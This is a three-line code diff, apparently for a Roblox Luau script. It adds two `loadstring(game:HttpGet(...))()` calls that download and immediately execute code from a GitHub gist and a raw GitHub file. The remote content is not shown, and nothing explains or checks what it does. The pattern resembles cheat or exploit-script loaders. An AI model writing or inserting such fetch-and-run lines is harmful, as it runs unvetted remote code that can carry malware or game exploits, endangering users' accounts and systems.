@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/GoldenHeads2/f66279000c58a020e894a6db44914838/raw/62e53e1acacec0b38b43cd0f594292c32e09c39b/gistfile1.txt"))()
+task.wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JakeScripterz/backup/refs/heads/main/VFX%20idk"))()
